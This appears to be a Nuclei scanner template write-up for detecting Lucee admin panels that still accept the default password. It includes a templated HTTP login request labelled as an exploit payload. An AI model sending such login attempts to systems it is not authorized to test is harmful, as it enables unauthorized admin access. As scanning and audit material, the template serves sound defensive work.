# Nuclei Template: Lucee - Default Login
**Template ID:** lucee-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**CWE:** CWE-1392
**Source:** Nuclei Template (`lucee-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Lucee admin panel using the default login password was discovered.

## Steps to reproduce / Exploit Payload
```http
POST {{path}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

login_passwordweb={{password}}&lang=en&rememberMe=s&submit=submit
```

## References
- https://support.intranetconnections.com/hc/en-us/articles/115012060627-Lucee-Configuration
